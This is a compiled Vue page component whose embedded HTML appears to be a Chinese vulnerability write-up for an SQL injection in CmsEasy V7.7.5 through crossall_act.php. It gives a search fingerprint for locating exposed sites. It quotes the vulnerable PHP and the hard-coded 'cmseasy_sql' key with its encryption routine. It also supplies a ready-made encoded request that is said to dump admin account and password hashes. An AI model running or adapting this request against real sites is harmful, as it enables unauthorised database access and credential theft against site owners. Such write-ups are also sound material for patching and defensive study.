import{_ as e}from"./plugin-vue_export-helper-c27b6911.js";import{o as n,c as i,e as s}from"./app-58e4a7d6.js";const a={},d=s(`<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p>CmsEasy 存在SQL注入漏洞，通过文件 service.php 加密SQL语句执行即可执行任意SQL命令</p><h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>CmsEasy V7.7.5_20210919
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="网络测绘" tabindex="-1"><a class="header-anchor" href="#网络测绘" aria-hidden="true">#</a> 网络测绘</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>body=&quot;cmseasyedit&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205181431042.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>存在漏洞的文件为 <code>lib/default/crossall_act.php</code></p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205181431425.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>其中需要注意的代码为</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>function execsql_action(){
        $sqlquery=front::get(&quot;sql&quot;);
        $sqlquery=service::getInstance()-&gt;unlockString($sqlquery,&quot;cmseasy_sql&quot;);

        $returndata=tdatabase::getInstance()-&gt;rec_query_one($sqlquery);
        echo json_encode($returndata);
        exit;
    }
    function execsqls_action(){
            $sqlquery=front::get(&quot;sql&quot;);
            $sqlquery=service::getInstance()-&gt;unlockString($sqlquery,&quot;cmseasy_sql&quot;);

            $returndata=tdatabase::getInstance()-&gt;rec_query($sqlquery);
            echo json_encode($returndata);
            exit;
        }
    function execupdate_action(){
        $sqlquery=front::get(&quot;sql&quot;);
        $sqlquery=service::getInstance()-&gt;unlockString($sqlquery,&quot;cmseasy_sql&quot;);

        $returndata=tdatabase::getInstance()-&gt;query($sqlquery);
        echo json_encode($returndata);
        exit;
    }
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>代码中传入参数 sql， 然后使用方法 unlockString 解码执行 SQL语句</p><p>查看文件 <code>lib/table/service.php</code></p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>public static function lockString($txt,$key=&#39;cmseasy_sql&#39;)
    {
        $chars = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-=+&quot;;
        $nh = rand(0,64);
        $ch = $chars[$nh];
        $mdKey = md5($key.$ch);
        $mdKey = substr($mdKey,$nh%8, $nh%8+8);
        $txt = base64_encode($txt);
        $tmp = &#39;&#39;;
        $i=0;$j=0;$k = 0;
        for ($i=0; $i&lt;strlen($txt); $i++) {
            $k = $k == strlen($mdKey) ? 0 : $k;
            $j = ($nh+strpos($chars,$txt[$i])+ord($mdKey[$k++]))%64;
            $tmp .= $chars[$j];
        }
        return urlencode($ch.$tmp);
    }

    /**对字符串进行解密。 crossall_act文件使用
     * @param $txt
     * @param string $key
     * @return bool|string
     */
    public static function unlockString($txt,$key=&#39;cmseasy_sql&#39;)
    {
        $txt = urldecode($txt);
        $chars = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-=+&quot;;
        $ch = $txt[0];
        $nh = strpos($chars,$ch);
        $mdKey = md5($key.$ch);
        $mdKey = substr($mdKey,$nh%8, $nh%8+8);
        $txt = substr($txt,1);
        $tmp = &#39;&#39;;
        $i=0;$j=0; $k = 0;
        for ($i=0; $i&lt;strlen($txt); $i++) {
            $k = $k == strlen($mdKey) ? 0 : $k;
            $j = strpos($chars,$txt[$i])-$nh - ord($mdKey[$k++]);
            while ($j&lt;0) $j+=64;
            $tmp .= $chars[$j];
        }
        return base64_decode($tmp);
    }
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>文件中得到了 <code>$key=&#39;cmseasy_sql&#39;</code> 和加解密方法，构造请求获取账号密码md5</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205181432691.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>/?case=crossall&amp;act=execsql&amp;sql=Ud-ZGLMFKBOhqavNJNK5WRCu9igJtYN1rVCO8hMFRM8NIKe6qmhRfWexXUiOqRN4aCe9aUie4Rtw5
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205181432971.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,19),l=[d];function t(r,c){return n(),i("div",null,l)}const m=e(a,[["render",t],["__file","CmsEasy crossall_act.php SQL注入漏洞.html.vue"]]);export{m as default};
